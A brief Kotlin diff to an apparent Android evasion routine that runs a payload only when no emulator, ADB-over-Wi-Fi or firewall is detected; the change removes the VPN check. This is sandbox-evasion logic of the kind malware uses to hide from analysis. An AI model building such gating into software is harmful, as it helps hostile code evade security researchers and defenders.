@@ -41,8 +41,7 @@ suspend inline fun Context.evade(
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                 hasVpn = async { hasVPN() }
         }
-        val evaded = (!isEmulator.await() && !hasAdbOverWifi.await() && !(hasVpn?.await()
-            ?: false) && !(hasFirewall?.await() ?: false))
+        val evaded = (!isEmulator.await() && !hasAdbOverWifi.await() && !(hasFirewall?.await() ?: false))
         if (evaded) {
             payload()
             return@withContext null
